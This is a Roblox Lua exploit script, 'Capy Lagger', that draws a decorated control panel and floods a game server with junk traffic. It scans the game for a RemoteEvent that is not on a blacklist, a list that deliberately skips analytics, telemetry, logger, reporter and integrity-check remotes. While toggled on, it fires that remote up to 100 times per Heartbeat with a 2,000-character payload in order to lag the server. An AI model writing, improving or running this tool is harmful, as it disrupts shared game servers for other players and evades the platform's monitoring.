--[[
    CAPY LAGGER: WINTER ULTIMATE EDITION
    Designed by: Werzz | Logic: CapyCore v3
]]

-- // SERVICES //
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

-- // LOGIC CONFIGURATION //
local blacklistedNames = {
    "PlaceCooldownFromChat", "AdminPanelService", "AdminPanel",
    "IntegrityCheckProcessor", "LocalizationTableAnalyticsSender",
    "LocalizationService", "Analytics", "Telemetry", "Logger",
    "Reporter", "CanChatWith", "SetPlayerBlockList", "UpdatePlayerBlockList",
    "NewPlayerGroupDetails", "NewPlayerCanManageDetails", "SendPlayerBlockList",
    "UpdateLocalPlayerBlockList", "SendPlayerProfileSettings",
    "RequestPlayerProfileSettings", "UpdatePlayerProfileSettings",
    "ShowFriendJoinedPlayerToast", "ShowPlayerJoinedFriendsToast",
    "CreateOrJoinParty", "ServerSideBulkPurchaseEvent", "SetDialogInUse",
    "ContactListInvokeIrisInvite", "ContactListIrisInviteTeleport",
    "UpdateCurrentCall", "RequestDeviceCameraOrientationCapability",
    "ReceiveLikelySpeakingUsers", "ReferredPlayerJoin", "Update",
    "RE/Tools/Cooldown", "RE/FuseMachine/RevealNow", "RE/FuseMachine/FuseAnimation",
    "RE/NotificationService/Notify", "RE/PlotService/ClaimCoins",
    "RE/PlotService/Sell", "RE/PlotService/Open", "RE/PlotService/ToggleFriends",
    "RE/PlotService/CashCollected", "RE/ChatService/ChatMessage",
    "RE/SoundService/PlayClientSound", "RE/Snapshot/RealiableChannel",
    "RE/CommandsService/OpenCommandBar", "RE/92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
    "92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698", "6411a778-07a5-4513-b1c7-60b65ae05ac8",
    "RE/GameService/SpawnEffect", "RE/Leaderboard/ReplicateDisplayNames",
    "eb9dee81-7718-4020-b6b2-219888488d13", "fce51e06-a587-4ff0-9e19-869eb1859a01",
    "680db8c7-c46a-492c-b451-6e980910902c", "RE/StealService/Grab",
    "RE/PlotService/Place", "RE/StealService/StealingSuccess",
    "RE/StealService/StealingFailure", "RE/CombatService/ApplyImpulse",
    "RE/InventoryService/Sort", "RE/StockEventService/SetFocused",
    "RE/StockEventService/Return", "RE/StockEventService/Redeem",
    "RE/MerchantService/SetFocused", "RE/MerchantService/Animation",
    "RE/SantaMerchantService/SetFocused", "RE/SantaMerchantService/Animation",
    "RE/SantaMerchantService/CollectGoldElf", "RE/ShopService/Purchase",
    "RE/TutorialService/StartTutorial", "RE/TutorialService/FinishTutorial",
    "RE/TeleportService/Reconnect"
}

local priorityTargets = {
    "WhyAreTheyTargetingMe!!", "FisherMan", "Chat", "AFK", "CookiesService"
}

local Settings = {
    LagEnabled = false,
    PacketsPerSecond = 5,
    MaxPackets = 100
}

local TargetRemote = nil
local uuid = HttpService:GenerateGUID(false)

-- // UI ENGINE //
local UI = {}

function UI:Create(class, props)
    local obj = Instance.new(class)
    for k, v in pairs(props) do
        obj[k] = v
    end
    return obj
end

function UI:Tween(obj, props, time, style, dir)
    TweenService:Create(obj, TweenInfo.new(time or 0.3, style or Enum.EasingStyle.Quint, dir or Enum.EasingDirection.Out), props):Play()
end

function UI:Rainbow(obj)
    task.spawn(function()
        local t = 0
        while obj.Parent do
            t = t + 0.005
            obj.Color = Color3.fromHSV(t % 1, 0.8, 1)
            RunService.RenderStepped:Wait()
        end
    end)
end

-- // CLEANUP //
if CoreGui:FindFirstChild("CapyLaggerUltimate") then CoreGui.CapyLaggerUltimate:Destroy() end

local ScreenGui = UI:Create("ScreenGui", {
    Name = "CapyLaggerUltimate",
    Parent = CoreGui,
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling
})

-- // MAIN FRAME //
local Main = UI:Create("Frame", {
    Parent = ScreenGui,
    Size = UDim2.new(0, 0, 0, 0), -- Анимация старта (раскроется позже)
    Position = UDim2.new(0.5, 0, 0.45, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = Color3.fromRGB(12, 12, 18),
    BorderSizePixel = 0,
    ClipsDescendants = true
})
UI:Create("UICorner", {Parent = Main, CornerRadius = UDim.new(0, 16)})

-- Gradient Stroke
local Stroke = UI:Create("UIStroke", {
    Parent = Main,
    Thickness = 2,
    Transparency = 0,
    Color = Color3.fromRGB(255, 255, 255)
})
local StrokeGrad = UI:Create("UIGradient", {
    Parent = Stroke,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
    }),
    Rotation = 45
})
-- Rotate Gradient Loop
task.spawn(function()
    while StrokeGrad.Parent do
        StrokeGrad.Rotation = StrokeGrad.Rotation + 1
        RunService.RenderStepped:Wait()
    end
end)

-- // SNOW EFFECT ENGINE ❄️ //
local SnowContainer = UI:Create("Frame", {
    Parent = Main,
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    ZIndex = 1
})

local function SpawnSnow()
    local flake = UI:Create("Frame", {
        Parent = SnowContainer,
        Size = UDim2.new(0, math.random(2, 5), 0, math.random(2, 5)),
        Position = UDim2.new(math.random(), 0, -0.1, 0),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = math.random(3, 7) / 10
    })
    UI:Create("UICorner", {Parent = flake, CornerRadius = UDim.new(1, 0)})
    
    local duration = math.random(20, 50) / 10
    
    local tween = TweenService:Create(flake, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
        Position = UDim2.new(flake.Position.X.Scale + (math.random(-2, 2)/10), 0, 1.1, 0),
        Rotation = math.random(0, 360)
    })
    tween:Play()
    tween.Completed:Connect(function() flake:Destroy() end)
end

-- Snow Loop
task.spawn(function()
    while Main.Parent do
        if math.random(1, 3) == 1 then SpawnSnow() end
        task.wait(0.1)
    end
end)

-- // UI CONTENT //

-- Title
local Title = UI:Create("TextLabel", {
    Parent = Main,
    Text = "CAPY<font color='#00FFFF'>LAGGER</font>",
    RichText = true,
    Size = UDim2.new(1, 0, 0, 40),
    Position = UDim2.new(0, 0, 0, 10),
    BackgroundTransparency = 1,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Font = Enum.Font.GothamBlack,
    TextSize = 20,
    ZIndex = 2
})

-- Status Badge
local StatusBadge = UI:Create("Frame", {
    Parent = Main,
    Size = UDim2.new(0, 220, 0, 26),
    Position = UDim2.new(0.5, -110, 0, 50),
    BackgroundColor3 = Color3.fromRGB(20, 20, 30),
    ZIndex = 2
})
UI:Create("UICorner", {Parent = StatusBadge, CornerRadius = UDim.new(0, 6)})
UI:Create("UIStroke", {Parent = StatusBadge, Color = Color3.fromRGB(40, 40, 50), Thickness = 1})

local StatusDot = UI:Create("Frame", {
    Parent = StatusBadge,
    Size = UDim2.new(0, 8, 0, 8),
    Position = UDim2.new(0, 10, 0.5, -4),
    BackgroundColor3 = Color3.fromRGB(100, 100, 100),
    ZIndex = 2
})
UI:Create("UICorner", {Parent = StatusDot, CornerRadius = UDim.new(1, 0)})

local StatusText = UI:Create("TextLabel", {
    Parent = StatusBadge,
    Text = "Scanning...",
    Size = UDim2.new(1, -30, 1, 0),
    Position = UDim2.new(0, 25, 0, 0),
    BackgroundTransparency = 1,
    TextColor3 = Color3.fromRGB(150, 150, 150),
    Font = Enum.Font.Code,
    TextSize = 11,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 2
})

-- The BIG Button
local MainButton = UI:Create("TextButton", {
    Parent = Main,
    Size = UDim2.new(0, 120, 0, 120),
    Position = UDim2.new(0.5, -60, 0.5, -10),
    BackgroundColor3 = Color3.fromRGB(25, 25, 35),
    Text = "",
    AutoButtonColor = false,
    ZIndex = 2
})
UI:Create("UICorner", {Parent = MainButton, CornerRadius = UDim.new(1, 0)}) -- Circle
local BtnStroke = UI:Create("UIStroke", {
    Parent = MainButton,
    Color = Color3.fromRGB(60, 60, 70),
    Thickness = 2,
    Transparency = 0.5
})
local Icon = UI:Create("ImageLabel", {
    Parent = MainButton,
    Size = UDim2.new(0, 50, 0, 50),
    Position = UDim2.new(0.5, -25, 0.5, -25),
    Image = "rbxassetid://3570695787", -- Power Icon-like glow
    ImageColor3 = Color3.fromRGB(80, 80, 80),
    BackgroundTransparency = 1,
    ZIndex = 3
})

-- Slider
local SliderPanel = UI:Create("Frame", {
    Parent = Main,
    Size = UDim2.new(0, 220, 0, 40),
    Position = UDim2.new(0.5, -110, 1, -50),
    BackgroundTransparency = 1,
    ZIndex = 2
})

local SliderLabel = UI:Create("TextLabel", {
    Parent = SliderPanel,
    Text = "Intensity: 5",
    Size = UDim2.new(1, 0, 0, 20),
    TextColor3 = Color3.fromRGB(180, 180, 180),
    BackgroundTransparency = 1,
    Font = Enum.Font.Gotham,
    TextSize = 12,
    ZIndex = 2
})

local SliderBar = UI:Create("TextButton", {
    Parent = SliderPanel,
    Size = UDim2.new(1, 0, 0, 4),
    Position = UDim2.new(0, 0, 0, 25),
    BackgroundColor3 = Color3.fromRGB(40, 40, 50),
    Text = "",
    AutoButtonColor = false,
    ZIndex = 2
})
UI:Create("UICorner", {Parent = SliderBar, CornerRadius = UDim.new(1, 0)})

local SliderFill = UI:Create("Frame", {
    Parent = SliderBar,
    Size = UDim2.new(0.05, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(0, 255, 255),
    ZIndex = 2
})
UI:Create("UICorner", {Parent = SliderFill, CornerRadius = UDim.new(1, 0)})
local SliderGlow = UI:Create("ImageLabel", {
    Parent = SliderFill,
    Size = UDim2.new(0, 15, 0, 15),
    Position = UDim2.new(1, -7, 0.5, -7),
    BackgroundTransparency = 1,
    Image = "rbxassetid://3570695787",
    ImageColor3 = Color3.fromRGB(0, 255, 255),
    ZIndex = 3
})

-- // OPENING ANIMATION //
Main.Size = UDim2.new(0, 0, 0, 0)
UI:Tween(Main, {Size = UDim2.new(0, 260, 0, 320)}, 0.6, Enum.EasingStyle.Back)

-- // LOGIC FUNCTIONS //

local function Pulse(obj)
    local info = TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
    local tween = TweenService:Create(obj, info, {ImageTransparency = 0.2})
    tween:Play()
    return tween
end

local pulseTween = nil

local function ToggleVisuals(state)
    if state then
        -- ON
        UI:Tween(MainButton, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
        UI:Tween(Icon, {ImageColor3 = Color3.fromRGB(255, 255, 255)})
        Icon.Image = "rbxassetid://3570695787" -- Glow
        pulseTween = Pulse(Icon)
        UI:Tween(BtnStroke, {Color = Color3.fromRGB(255, 100, 100), Transparency = 0})
    else
        -- OFF
        if pulseTween then pulseTween:Cancel() end
        Icon.ImageTransparency = 0
        UI:Tween(MainButton, {BackgroundColor3 = Color3.fromRGB(25, 25, 35)})
        UI:Tween(Icon, {ImageColor3 = Color3.fromRGB(80, 80, 80)})
        UI:Tween(BtnStroke, {Color = Color3.fromRGB(60, 60, 70), Transparency = 0.5})
    end
end

MainButton.MouseButton1Click:Connect(function()
    if not TargetRemote then return end
    Settings.LagEnabled = not Settings.LagEnabled
    ToggleVisuals(Settings.LagEnabled)
    
    if Settings.LagEnabled then
        StatusText.Text = "Sending Packets..."
        StatusText.TextColor3 = Color3.fromRGB(255, 80, 80)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
    else
        StatusText.Text = "Connected: " .. TargetRemote.Name
        StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(0, 255, 150)})
    end
end)

-- Slider Logic
local dragging = false
SliderBar.MouseButton1Down:Connect(function() dragging = true end)
UserInputService.InputEnded:Connect(function(input) 
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end 
end)

RunService.RenderStepped:Connect(function()
    if dragging then
        local mPos = UserInputService:GetMouseLocation().X
        local rPos = mPos - SliderBar.AbsolutePosition.X
        local perc = math.clamp(rPos / SliderBar.AbsoluteSize.X, 0, 1)
        
        SliderFill.Size = UDim2.new(perc, 0, 1, 0)
        local val = math.max(1, math.floor(perc * Settings.MaxPackets))
        Settings.PacketsPerSecond = val
        SliderLabel.Text = "Intensity: " .. val
        
        -- Color change based on intensity
        local col = Color3.fromHSV((1 - perc) * 0.3, 1, 1) -- Green to Red
        SliderFill.BackgroundColor3 = col
        SliderGlow.ImageColor3 = col
    end
end)

-- // SCANNER //
local function Scan()
    local found = nil
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local name = v.Name
            local bad = false
            for _, b in pairs(blacklistedNames) do
                if string.find(v:GetFullName(), b, 1, true) or string.find(name, b, 1, true) then
                    bad = true; break
                end
            end
            if not bad then
                found = v
                break
            end
        end
    end
    
    TargetRemote = found
    
    if TargetRemote then
        StatusText.Text = "Connected: " .. TargetRemote.Name
        StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(0, 255, 150)})
    else
        StatusText.Text = "Failed: Not Supported"
        StatusText.TextColor3 = Color3.fromRGB(255, 50, 50)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
        MainButton.AutoButtonColor = false
        MainButton.BackgroundColor3 = Color3.fromRGB(20, 10, 10)
    end
end

-- // LAG CORE (INSTANT STOP) //
RunService.Heartbeat:Connect(function()
    if not Settings.LagEnabled or not TargetRemote then return end
    
    local payload = string.rep("X", 2000)
    for i = 1, Settings.PacketsPerSecond do
        if not Settings.LagEnabled then break end -- Instant Break
        pcall(function() TargetRemote:FireServer(uuid, payload) end)
    end
end)

-- // DRAGGING //
local dragStart, startPos
local isDraggingGUI = false
Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDraggingGUI = true; dragStart = input.Position; startPos = Main.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if isDraggingGUI and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then isDraggingGUI = false end
end)

Scan()
